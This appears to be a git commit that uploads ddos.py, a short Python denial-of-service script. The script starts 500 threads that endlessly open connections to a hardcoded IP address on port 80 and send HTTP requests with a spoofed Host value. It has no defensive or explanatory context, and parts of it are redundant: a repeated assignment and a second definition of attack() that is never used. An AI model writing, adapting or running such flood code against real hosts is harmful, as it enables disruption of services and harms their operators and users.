c8c7d5de649b860a4db2cbfdfb078f3179158465
OnioNetwork <96256750+OnioNetwork@users.noreply.github.com>
2021-12-26 20:45:33 +0300

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,37 @@
+import socket
+import threading
+
+target = '173.0.77.100'
+fake_ip = '173.0.77.111'
+port = 80
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+attack_num = 0
+
+attack_num = 0
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
